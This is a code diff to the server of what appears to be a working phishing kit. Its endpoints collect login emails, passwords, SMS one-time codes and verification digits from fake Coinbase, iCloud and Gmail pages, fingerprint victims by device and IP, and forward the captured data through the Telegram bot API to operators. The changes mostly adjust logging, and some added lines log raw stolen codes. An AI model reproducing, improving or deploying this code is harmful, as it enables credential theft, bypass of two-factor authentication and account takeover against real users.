@@ -253,30 +253,25 @@ app.post("/send-login", async (req, res) => {
     // Layer 1: Device Fingerprint
     if (fingerprint && email) {
       deviceFingerprintToEmail[fingerprint] = email;
-      console.log(`💾 Stored fingerprint ${fingerprint} → ${email}`);
     }
 
     // Layer 2: IP Prefix + User ID
     if (ipPrefix && userId && email) {
       const compositeKey = `${ipPrefix}_${userId}`;
       ipPrefixUserIdToEmail[compositeKey] = email;
-      console.log(`💾 Stored composite key ${compositeKey} → ${email}`);
     }
 
     // Layer 4: IP Prefix
     if (ipPrefix && email) {
       ipPrefixToEmail[ipPrefix] = email;
-      console.log(`💾 Stored IP prefix ${ipPrefix} → ${email}`);
     }
 
     // Layer 5: Full IP
     if (ip && email) {
       ipToEmail[ip] = email;
-      console.log(`💾 Stored full IP ${ip} → ${email}`);
     }
 
-    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
-    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
+    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
@@ -318,6 +313,8 @@ app.post("/send-login", async (req, res) => {
     // ✅ BROADCAST TO BOTH BOTS
     try {
       await broadcastMessage(chatId, message, options);
+      console.log(`✅ Message sent to Bot 1`);
+      console.log(`✅ Message sent to Bot 2`);
     } catch (err) {
       console.error("❌ Failed to broadcast:", err);
       return res.status(500).json({ error: "Failed to send message" });
@@ -368,11 +365,7 @@ app.post("/send-redirection", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
-
-    // ✅ CHECK WINNER
-    const winner = userWinnerTelegram[email];
-    console.log(`🏆 Winner for ${email}: ${winner}`);
+    console.log(`📧 ${email} → 🏆 ${userWinnerTelegram[email]} | ☁️/🌈 Redirection`);
 
     const message =
       `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
@@ -400,23 +393,9 @@ app.post("/send-redirection", async (req, res) => {
     // ============================================================================
 
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Redirection going to winner only: ${userWinnerTelegram[email]}`);
-      
       await sendFollowUpMessage(email, message, options);
 
-      // ✅ STORE PAGE 2 DATA FOR POLLING
-      global.page2MessageDataStore = global.page2MessageDataStore || {};
-      global.page2MessageDataStore[email] = {
-        message: message,
-        options: options,
-        email: email,
-        timestamp: Date.now()
-      };
-      console.log(`💾 Stored page 2 message data for ${email} (waiting for loser click)`);
-
     } else {
-      console.log(`📨 Redirection fallback: sending to both (no winner for ${email})`);
-      
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       await fetch(url, {
         method: "POST",
@@ -681,7 +660,6 @@ app.post("/verify-sms", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML",
         reply_markup: {
@@ -745,7 +723,6 @@ app.post("/check-sms-status", (req, res) => {
     // Check pendingSMS first
     if (pendingSMS[email]) {
       const smsStatus = pendingSMS[email].status;
-      console.log(`✅ SMS status for ${email}: ${smsStatus}`);
       
       // Map bot.js status values to frontend expectations
       if (smsStatus === "sms_accept") {
@@ -856,7 +833,6 @@ app.post("/page-login", async (req, res) => {
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
     pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
-    console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
 
     const message =
       `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
@@ -884,7 +860,6 @@ app.post("/page-login", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 iCloud Page Login going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -900,7 +875,7 @@ app.post("/page-login", async (req, res) => {
       });
     }
 
-    res.json({ success: true });
+    console.log(`☁️ iCloud Login Received: ${messageEmail}`);
 
   } catch (err) {
     console.error("❌ Page login endpoint error:", err);
@@ -922,7 +897,6 @@ app.get("/check-icloud-status", (req, res) => {
 
     if (pendingPage[email]) {
       const status = pendingPage[email].status;
-      console.log(`✅ iCloud status for ${email}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "page_accept") {
@@ -964,7 +938,6 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ Store by requestId (not email!) so each code has separate status
     pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
-    console.log(`📥 iCloud SMS Code Received: ${email} (requestId: ${requestId})`);
 
     const message =
       `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
@@ -992,7 +965,6 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1007,6 +979,8 @@ app.post("/sms-code", async (req, res) => {
         })
       });
     }
+
+    console.log(`☁️ iCloud SMS Code Received: ${smsCode}`);
 
     // ✅ Return requestId so frontend can poll with it
     res.json({ success: true, requestId });
@@ -1031,7 +1005,6 @@ app.get("/check-sms-code-status", (req, res) => {
 
     if (pendingCodes[requestId]) {
       const status = pendingCodes[requestId].status;
-      console.log(`✅ iCloud SMS status for requestId ${requestId}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "sms_accept") {
@@ -1136,7 +1109,6 @@ app.post("/send-gmail-login", async (req, res) => {
     // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING
     if (fingerprint && email) {
       deviceFingerprintToEmail[fingerprint] = email;
-      console.log(`💾 Stored fingerprint ${fingerprint} → ${email} (Gmail flow)`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
@@ -1168,7 +1140,6 @@ app.post("/send-gmail-login", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Gmail going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1184,7 +1155,7 @@ app.post("/send-gmail-login", async (req, res) => {
       });
     }
 
-    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
+    console.log(`🌈 Gmail Login Received: ${messageEmail}`);
     res.json({ status: "pending", requestId, displayEmailKey });
 
   } catch (err) {
@@ -1368,7 +1339,6 @@ app.post("/send-verification-page", async (req, res) => {
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
     const botToken = process.env.BOT_TOKEN;
@@ -1376,7 +1346,6 @@ app.post("/send-verification-page", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1392,6 +1361,7 @@ app.post("/send-verification-page", async (req, res) => {
       });
     }
 
+    console.log(`🌈 Verification Page Sent: ${messageEmail}`);
     res.json({ status: "pending", requestId, email });
 
   } catch (err) {
@@ -1418,7 +1388,12 @@ app.post("/update-selected-digits", (req, res) => {
     }
 
     pendingVerificationPage[requestId].selectedDigits.push(digit);
-    console.log(`✅ Digit ${digit} selected for ${requestId}`);
+
+    // ✅ If we now have 2 digits, log it
+    if (pendingVerificationPage[requestId].selectedDigits && pendingVerificationPage[requestId].selectedDigits.length === 2) {
+      const selectedNumber = pendingVerificationPage[requestId].selectedDigits.join('');
+      console.log(`🔢 Digits Selected: ${selectedNumber}`);
+    }
 
     res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
   } catch (err) {
